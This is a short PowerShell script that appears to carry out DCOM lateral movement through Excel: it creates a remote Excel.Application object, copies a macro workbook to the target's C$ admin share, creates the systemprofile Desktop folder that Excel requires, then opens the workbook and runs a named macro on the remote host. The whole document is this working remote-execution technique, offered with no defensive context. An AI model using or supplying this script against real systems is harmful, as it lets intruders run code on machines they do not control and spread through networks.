## First create Excel macro file as ExcelFile.xls

$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application","<REMOTE_IP>"))

# $com | Get-Member
# Check if we have Run & Workbooks objects

$LocalPath = "C:\<PATH>\ExcelFile.xls"
$RemotePath = "\\<REMOTE_IP>\c$\ExcelFile.xls"

[System.IO.File]::Copy($LocalPath, $RemotePath, $True)

$TempProfilePath = [system.io.directory]::createDirectory("\\<REMOTE_IP>\c$\Windows\sysWOW64\config\systemprofile\Desktop")

$Workbook = $com.Workbooks.Open("C:\ExcelFile.xls")
$com.Run("<MACRO_NAME>")
